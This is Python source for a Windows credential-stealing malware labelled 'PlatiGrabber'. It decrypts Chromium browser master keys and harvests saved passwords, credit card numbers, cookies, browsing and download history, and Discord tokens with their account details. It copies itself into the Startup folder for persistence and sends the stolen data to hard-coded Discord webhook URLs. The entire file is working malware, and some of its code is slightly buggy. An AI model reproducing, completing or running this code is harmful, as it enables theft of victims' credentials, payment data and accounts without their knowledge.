import os; import threading; import requests; import socket; import sqlite3; import shutil; from re import findall; from datetime import datetime
from json import loads; from Crypto.Cipher import AES; from base64 import b64decode; from win32crypt import CryptUnprotectData
from zipfile import ZipFile; from discord_webhook import DiscordWebhook, DiscordEmbed; from urllib.request import Request, urlopen

APPDATA = os.getenv('LOCALAPPDATA')

browsers = {
    'amigo': APPDATA + '\\Amigo\\User Data',
    'torch': APPDATA + '\\Torch\\User Data',
    'kometa': APPDATA + '\\Kometa\\User Data',
    'orbitum': APPDATA + '\\Orbitum\\User Data',
    'cent-browser': APPDATA + '\\CentBrowser\\User Data',
    '7star': APPDATA + '\\7Star\\7Star\\User Data',
    'sputnik': APPDATA + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': APPDATA + '\\Vivaldi\\User Data',
    'googlechromesxs': APPDATA + '\\Google\\Chrome SxS\\User Data',
    'googlechrome': APPDATA + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': APPDATA + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': APPDATA + '\\Microsoft\\Edge\\User Data',
    'uran': APPDATA + '\\uCozMedia\\Uran\\User Data',
    'yandex': APPDATA + '\\Yandex\\YandexBrowser\\User Data',
    'brave': APPDATA + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': APPDATA + '\\Iridium\\User Data',
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = loads(c)

    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def save_results(browser_name, data_type, content):
    if not os.path.exists(browser_name):
        os.makedirs("Grabbed/", exist_ok=True)
        os.makedirs(f"Grabbed/{browser_name}", exist_ok=True)
    if content is not None:
        try:
            open(f'Grabbed/{browser_name}/{data_type}.txt', 'w').write(content)
        except:
            pass


def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, 'login_db')
    conn = sqlite3.connect('login_db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
URL: {row[0]}
Email: {row[1]}
Password: {password}
______________________         
        """
    conn.close()
    os.remove('login_db')
    return result


def get_credit_cards(path: str, profile: str, master_key):
    cards_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(cards_db):
        return

    result = ""
    shutil.copy(cards_db, 'cards_db')
    conn = sqlite3.connect('cards_db')
    cursor = conn.cursor()
    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result += f"""
Name On Card: {row[0]}
Card Number: {card_number}
Expires On:  {row[1]} / {row[2]}
Added On: {datetime.fromtimestamp(row[4])}
______________________         
        """

    conn.close()
    os.remove('cards_db')
    return result


def get_cookies(path: str, profile: str, master_key):
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    if not os.path.exists(cookie_db):
        return
    result = ""
    shutil.copy(cookie_db, 'cookie_db')
    conn = sqlite3.connect('cookie_db')
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result += f"""
Host : {row[0]}
Cookie Name : {row[1]}
Cookie: {cookie}
______________________        
        """

    conn.close()
    os.remove('cookie_db')
    return result


def get_web_history(path: str, profile: str):
    web_history_db = f'{path}\\{profile}\\History'
    result = ""
    if not os.path.exists(web_history_db):
        return

    shutil.copy(web_history_db, 'web_history_db')
    conn = sqlite3.connect('web_history_db')
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue
        result += f"""
URL: {row[0]}
Title: {row[1]}
Visited Time: {row[2]}
______________________         
        """
    conn.close()
    os.remove('web_history_db')
    return result


def get_downloads(path: str, profile: str):
    downloads_db = f'{path}\\{profile}\\History'
    if not os.path.exists(downloads_db):
        return
    result = ""
    shutil.copy(downloads_db, 'downloads_db')
    conn = sqlite3.connect('downloads_db')
    cursor = conn.cursor()
    cursor.execute('SELECT tab_url, target_path FROM downloads')
    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue
        result += f"""
Download URL: {row[0]}
Local Path: {row[1]}
______________________     
        """

    conn.close()
    os.remove('downloads_db')


def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

def send():
    data = {
        "content" : "||@everyone|| ",
        "username": 'Grabber'
    }

    data["embeds"] = [
        {
            "title" : "Info",
            "color": 16711680,
            "description": f"**Grabbed From :** `{socket.gethostname()}`"
        }
    ]

    with ZipFile(f"Grabbed.zip", "w") as zf:
        for folder in os.listdir("Grabbed"):
            if not ".zip" in folder: 
                zf.write("Grabbed" + "/" + folder)
            for file in os.listdir("Grabbed/"+folder):
                zf.write(f"Grabbed/{folder}" + "/" + file)
                
    with open("Grabbed.zip", 'rb') as f:
        threading.Thread(target=requests.post("https://discord.com/api/webhooks/1056230911517139035/w_uFOGLkE1TnBBM3eypfrgfeY8DW4SSOt6gnhRrJprXuwTimZQYWRTvbrT1oKdTpE2Vh", json=data))
        threading.Thread(target=requests.post("https://discord.com/api/webhooks/1056230911517139035/w_uFOGLkE1TnBBM3eypfrgfeY8DW4SSOt6gnhRrJprXuwTimZQYWRTvbrT1oKdTpE2Vh",files={'file': f}))
        
    os.remove("Grabbed.zip")
    shutil.rmtree('Grabbed/')

webhook_url = ["https://discord.com/api/webhooks/1070313681059069952/zraiLm2DkShXGo3JR4pAaT-Z0OCXGrx97vahhrc6VgrE7ruZqiG-WOfYsfs8bTzjN0-0", "https://discord.com/api/webhooks/1070349306411876362/A2YTEv4Zg6RHEo5ycPsCFYvCzuYzB7v0Of2ISISYJq5f0kbG4XcR7Wb4wJdjXSee2Mj1"]
PCname = os.getlogin()
name_of_keylogger_file = "exemple1"
name_of_folder_picture = "exemple2"
log_file = "C:/Users/" + PCname + "/AppData/Local/Temp/" + name_of_keylogger_file + ".txt"
current_file = os.path.abspath(__file__)
destination = "C:/Users/" + PCname + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
destinationPicture = "C:/Users/" + PCname + "/AppData/Local/Temp/" + name_of_folder_picture

if not os.path.exists(destination):
    os.makedirs(destination)

else:
    for entry in os.scandir(destinationPicture):
        if entry.is_file():
            os.unlink(entry.path)
        elif entry.is_dir():
            shutil.rmtree(entry.path)

file_name = os.path.basename(current_file)

if not os.path.exists(os.path.join(destination, file_name)):
    shutil.copy(current_file, destination)

key_count = 0
screen_count = 0

tokens = []
cleaned = []
checker = []


def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(
            buff[15:])[:-16].decode()
    except:
        return "Error"


def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"

    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except:
            continue
        for file in os.listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue
        
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error":
                continue
            checker.append(tok)

            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except:
                        continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions',headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0],"%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0],"%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)

                        webhook2 = DiscordWebhook(url=webhook_url[0], username="Plati~Logger")
                        webhook1 = DiscordWebhook(url=webhook_url[1], username="Plati~Logger")

                        webhook2.avatar_url = "https://i.pinimg.com/236x/60/2e/7b/602e7b6f535bb9e113b74025b09fe62c.jpg"
                        webhook1.avatar_url = "https://i.pinimg.com/236x/60/2e/7b/602e7b6f535bb9e113b74025b09fe62c.jpg"

                        embed2 = DiscordEmbed(title='PlatiGrabber ~ Token Grabber',description=f"**{pc_username} | {ip}**", color='d17823')

                        embed2.add_embed_field(name="Token:", value=f"```{tok}```", inline=False)
                        embed2.add_embed_field(name="Email:", value=f"```{email}```", inline=True)
                        embed2.add_embed_field(name="Phone:", value=f"```{phone}```", inline=True)
                        embed2.add_embed_field(name="Pseudo:", value=f"```{user_name}```", inline=True)
                        embed2.add_embed_field(name="MFA:", value=f"```{mfa_enabled}```", inline=True)
                        embed2.add_embed_field(name="Has nitro:", value=f"```{has_nitro}```", inline=True)
                        if days_left:
                            embed2.add_embed_field(name="Expire in: ", value=f"```{days_left} day(s)```", inline=True)
                        else:
                            target=embed2.add_embed_field(name="Expire in: ", value=f"```None```", inline=True)
                        embed2.set_thumbnail(url="https://cdn.discordapp.com/attachments/1030793561869910059/1070347629864693770/62f863adadff31b120ac55afeacdb4c6-removebg-preview.png")

                        embed2.set_footer(text='Plati~Grabber',icon_url='https://i.pinimg.com/236x/60/2e/7b/602e7b6f535bb9e113b74025b09fe62c.jpg')

                        embed2.set_timestamp()
                        webhook2.add_embed(embed2)
                        webhook1.add_embed(embed2)

                        try:
                            threading.Thread(target=webhook2.execute).start()
                            threading.Thread(target=webhook1.execute).start()
                        except:
                            continue
                else:
                    continue 

def init():
    os.system("")
    if os.name != 'nt':
        exit()
    threading.Thread(target=get_token).start()
    for browser in installed_browsers():
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        threading.Thread(target = save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))).start()
        threading.Thread(target = save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))).start()
        threading.Thread(target = save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))).start()
        threading.Thread(target = save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))).start()
        threading.Thread(target = save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))).start()
    threading.Thread(target= send).start()
    